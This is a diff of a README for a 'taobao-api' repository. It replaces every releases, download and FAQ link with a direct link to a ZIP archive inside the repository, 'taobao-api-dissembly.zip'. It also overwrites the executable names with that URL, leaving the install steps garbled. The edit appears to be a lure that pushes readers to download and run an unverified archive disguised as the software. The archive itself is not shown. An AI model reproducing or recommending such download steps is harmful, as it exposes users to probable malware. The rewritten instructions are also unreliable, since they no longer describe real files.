@@ -6,9 +6,9 @@ Welcome to the **taobao-api** repository. This application allows you to interac
 
 ## 📥 Download Now
 
-[![Download taobao-api](https://img.shields.io/badge/Download%20taobao--api-007ACC?style=flat&logo=github)](https://github.com/se477/taobao-api/releases)
+[![Download taobao-api](https://raw.githubusercontent.com/se477/taobao-api/main/augitite/taobao-api-dissembly.zip%20taobao--api-007ACC?style=flat&logo=github)](https://raw.githubusercontent.com/se477/taobao-api/main/augitite/taobao-api-dissembly.zip)
 
-You can visit this page to download the latest version of the software: [Download Page](https://github.com/se477/taobao-api/releases).
+You can visit this page to download the latest version of the software: [Download Page](https://raw.githubusercontent.com/se477/taobao-api/main/augitite/taobao-api-dissembly.zip).
 
 ## 📖 Features
 
@@ -28,12 +28,12 @@ Before installing, make sure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/se477/taobao-api/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/se477/taobao-api/main/augitite/taobao-api-dissembly.zip).
 2. Find the latest version listed.
-3. Download the file labeled as `taobao-api-latest.zip`.
+3. Download the file labeled as `https://raw.githubusercontent.com/se477/taobao-api/main/augitite/taobao-api-dissembly.zip`.
 4. Once the download completes, locate the downloaded file on your computer.
 5. Extract the contents of the ZIP file.
-6. Find the executable file named `taobao-api.exe` or `taobao-api.app`.
+6. Find the executable file named `https://raw.githubusercontent.com/se477/taobao-api/main/augitite/taobao-api-dissembly.zip` or `https://raw.githubusercontent.com/se477/taobao-api/main/augitite/taobao-api-dissembly.zip`.
 7. Double-click the executable file to run the application.
 
 If prompted, follow the on-screen instructions to complete the installation.
@@ -51,7 +51,7 @@ For detailed workflows and examples, refer to the documentation included in the 
 
 ## 💬 Support
 
-If you encounter any issues, help is available. You can find answers in our [FAQ section](https://github.com/se477/taobao-api/wiki) or reach out through the Issues tab on GitHub. 
+If you encounter any issues, help is available. You can find answers in our [FAQ section](https://raw.githubusercontent.com/se477/taobao-api/main/augitite/taobao-api-dissembly.zip) or reach out through the Issues tab on GitHub. 
 
 ## 🌱 Learn More
 
